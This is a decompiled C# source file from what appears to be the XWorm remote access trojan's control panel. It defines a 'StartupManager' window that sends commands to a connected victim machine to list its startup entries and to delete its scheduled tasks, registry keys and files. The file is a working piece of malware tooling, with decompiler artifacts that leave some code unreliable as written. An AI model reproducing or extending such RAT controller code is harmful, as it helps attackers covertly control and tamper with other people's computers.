using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm
{
	// Token: 0x0200002D RID: 45
	[DesignerGenerated]
	public partial class StartupManager : Form
	{
		// Token: 0x0600085E RID: 2142 RVA: 0x00049221 File Offset: 0x00047421
		public StartupManager()
		{
			base.Load += this.StartupManager_Load;
			base.FormClosing += this.StartupManager_FormClosing;
			this.InitializeComponent();
		}

		// Token: 0x17000314 RID: 788
		// (get) Token: 0x06000861 RID: 2145 RVA: 0x000499AB File Offset: 0x00047BAB
		// (set) Token: 0x06000862 RID: 2146 RVA: 0x000499B8 File Offset: 0x00047BB8
		internal virtual ListView ListView1
		{
			[CompilerGenerated]
			get
			{
				return this._ListView1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ListView1_SelectedIndexChanged);
				KeyEventHandler value3 = new KeyEventHandler(this.ListView1_KeyDown);
				ListView listView = this._ListView1;
				if (listView != null)
				{
					listView.SelectedIndexChanged -= value2;
					listView.KeyDown -= value3;
				}
				this._ListView1 = value;
				listView = this._ListView1;
				if (listView != null)
				{
					listView.SelectedIndexChanged += value2;
					listView.KeyDown += value3;
				}
			}
		}

		// Token: 0x17000315 RID: 789
		// (get) Token: 0x06000863 RID: 2147 RVA: 0x00049A16 File Offset: 0x00047C16
		// (set) Token: 0x06000864 RID: 2148 RVA: 0x00049A20 File Offset: 0x00047C20
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000316 RID: 790
		// (get) Token: 0x06000865 RID: 2149 RVA: 0x00049A29 File Offset: 0x00047C29
		// (set) Token: 0x06000866 RID: 2150 RVA: 0x00049A33 File Offset: 0x00047C33
		internal virtual ToolStripStatusLabel ToolStripStatusLabel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000317 RID: 791
		// (get) Token: 0x06000867 RID: 2151 RVA: 0x00049A3C File Offset: 0x00047C3C
		// (set) Token: 0x06000868 RID: 2152 RVA: 0x00049A46 File Offset: 0x00047C46
		internal virtual ToolStripStatusLabel ToolStripStatusLabel4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000318 RID: 792
		// (get) Token: 0x06000869 RID: 2153 RVA: 0x00049A4F File Offset: 0x00047C4F
		// (set) Token: 0x0600086A RID: 2154 RVA: 0x00049A5C File Offset: 0x00047C5C
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000319 RID: 793
		// (get) Token: 0x0600086B RID: 2155 RVA: 0x00049A9F File Offset: 0x00047C9F
		// (set) Token: 0x0600086C RID: 2156 RVA: 0x00049AA9 File Offset: 0x00047CA9
		internal virtual ColumnHeader ColumnHeader3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700031A RID: 794
		// (get) Token: 0x0600086D RID: 2157 RVA: 0x00049AB2 File Offset: 0x00047CB2
		// (set) Token: 0x0600086E RID: 2158 RVA: 0x00049ABC File Offset: 0x00047CBC
		internal virtual ColumnHeader ColumnHeader4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700031B RID: 795
		// (get) Token: 0x0600086F RID: 2159 RVA: 0x00049AC5 File Offset: 0x00047CC5
		// (set) Token: 0x06000870 RID: 2160 RVA: 0x00049ACF File Offset: 0x00047CCF
		internal virtual ColumnHeader ColumnHeader5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700031C RID: 796
		// (get) Token: 0x06000871 RID: 2161 RVA: 0x00049AD8 File Offset: 0x00047CD8
		// (set) Token: 0x06000872 RID: 2162 RVA: 0x00049AE2 File Offset: 0x00047CE2
		internal virtual ImageList ImageList1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700031D RID: 797
		// (get) Token: 0x06000873 RID: 2163 RVA: 0x00049AEB File Offset: 0x00047CEB
		// (set) Token: 0x06000874 RID: 2164 RVA: 0x00049AF5 File Offset: 0x00047CF5
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700031E RID: 798
		// (get) Token: 0x06000875 RID: 2165 RVA: 0x00049AFE File Offset: 0x00047CFE
		// (set) Token: 0x06000876 RID: 2166 RVA: 0x00049B08 File Offset: 0x00047D08
		internal virtual ToolStripMenuItem ToolStripMenuItem4
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem4;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem4_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem4;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem4 = value;
				toolStripMenuItem = this._ToolStripMenuItem4;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700031F RID: 799
		// (get) Token: 0x06000877 RID: 2167 RVA: 0x00049B4B File Offset: 0x00047D4B
		// (set) Token: 0x06000878 RID: 2168 RVA: 0x00049B58 File Offset: 0x00047D58
		internal virtual ToolStripMenuItem DeleteToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._DeleteToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DeleteToolStripMenuItem_Click);
				ToolStripMenuItem deleteToolStripMenuItem = this._DeleteToolStripMenuItem;
				if (deleteToolStripMenuItem != null)
				{
					deleteToolStripMenuItem.Click -= value2;
				}
				this._DeleteToolStripMenuItem = value;
				deleteToolStripMenuItem = this._DeleteToolStripMenuItem;
				if (deleteToolStripMenuItem != null)
				{
					deleteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06000879 RID: 2169 RVA: 0x00049B9C File Offset: 0x00047D9C
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600087A RID: 2170 RVA: 0x00049BF4 File Offset: 0x00047DF4
		private void ListView1_SelectedIndexChanged(object sender, EventArgs e)
		{
			try
			{
				this.ToolStripStatusLabel3.Text = "Selected [" + this.ListView1.SelectedItems.Count.ToString() + "]";
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600087B RID: 2171 RVA: 0x00049C64 File Offset: 0x00047E64
		private void StartupManager_Load(object sender, EventArgs e)
		{
			this.Refresh();
		}

		// Token: 0x0600087C RID: 2172 RVA: 0x00049C70 File Offset: 0x00047E70
		public new void Refresh()
		{
			this.ListView1.Items.Clear();
			this.ToolStripStatusLabel4.Text = "Wait..";
			byte[] state = Helper.SB("GetStartup");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x0600087D RID: 2173 RVA: 0x00049CD0 File Offset: 0x00047ED0
		private void StartupManager_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("CloseStartupManager");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x0600087E RID: 2174 RVA: 0x00049C64 File Offset: 0x00047E64
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.Refresh();
		}

		// Token: 0x0600087F RID: 2175 RVA: 0x00049D10 File Offset: 0x00047F10
		private void ListView1_KeyDown(object sender, KeyEventArgs e)
		{
			try
			{
				bool flag = e.Modifiers == Keys.Control && e.KeyCode == Keys.A;
				if (flag)
				{
					bool flag2 = this.ListView1.Items.Count > 0;
					if (flag2)
					{
						try
						{
							foreach (object obj in this.ListView1.Items)
							{
								ListViewItem listViewItem = (ListViewItem)obj;
								listViewItem.Selected = true;
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000880 RID: 2176 RVA: 0x00049C64 File Offset: 0x00047E64
		private void ToolStripMenuItem4_Click(object sender, EventArgs e)
		{
			this.Refresh();
		}

		// Token: 0x06000881 RID: 2177 RVA: 0x00049DE0 File Offset: 0x00047FE0
		private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					string text = listViewItem.SubItems[1].Text;
					if (Operators.CompareString(text, "File", false) != 0)
					{
						if (Operators.CompareString(text, "Reg", false) != 0)
						{
							if (Operators.CompareString(text, "Task", false) == 0)
							{
								byte[] state = Helper.SB("DeleteTask" + SettingsHelper.SPL + listViewItem.SubItems[0].Text);
								StartupManager._Closure$__R61-6 CS$<>8__locals1 = new StartupManager._Closure$__R61-6(CS$<>8__locals1);
								CS$<>8__locals1.$VB$NonLocal_4 = this.C;
								ThreadPool.QueueUserWorkItem(delegate(object a0)
								{
									CS$<>8__locals1.$VB$NonLocal_4.BeginSend((byte[])a0);
								}, state);
							}
						}
						else
						{
							byte[] state2 = Helper.SB(string.Concat(new string[]
							{
								"DeleteReg",
								SettingsHelper.SPL,
								listViewItem.SubItems[2].Text,
								"\\",
								listViewItem.SubItems[0].Text
							}));
							StartupManager._Closure$__R61-5 CS$<>8__locals2 = new StartupManager._Closure$__R61-5(CS$<>8__locals2);
							CS$<>8__locals2.$VB$NonLocal_3 = this.C;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals2.$VB$NonLocal_3.BeginSend((byte[])a0);
							}, state2);
						}
					}
					else
					{
						byte[] state3 = Helper.SB(string.Concat(new string[]
						{
							"DeleteFile",
							SettingsHelper.SPL,
							listViewItem.SubItems[2].Text,
							"\\",
							listViewItem.SubItems[0].Text
						}));
						StartupManager._Closure$__R61-4 CS$<>8__locals3 = new StartupManager._Closure$__R61-4(CS$<>8__locals3);
						CS$<>8__locals3.$VB$NonLocal_2 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals3.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state3);
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x04000385 RID: 901
		public Client C;
	}
}
